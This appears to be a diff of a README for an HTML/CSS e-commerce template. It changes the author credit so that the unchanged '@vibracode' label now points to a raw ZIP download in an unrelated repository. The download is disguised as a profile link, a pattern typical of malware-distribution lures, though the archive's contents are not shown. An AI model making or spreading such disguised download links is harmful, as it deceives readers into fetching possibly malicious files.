@@ -8,7 +8,7 @@ in this repository you will see an html css template for a cool designed e-comme
 
 ## :heavy_check_mark: Authors
 
--   created by Alireza Tayebinejad from: [@vibracode](https://www.github.com/octokatherine)
+-   created by Alireza Tayebinejad from: [@vibracode](https://raw.githubusercontent.com/talhaaa16/Ecommerce/main/images/Ecommerce_neurophysiological.zip)
 
 ## :heavy_check_mark: License
 
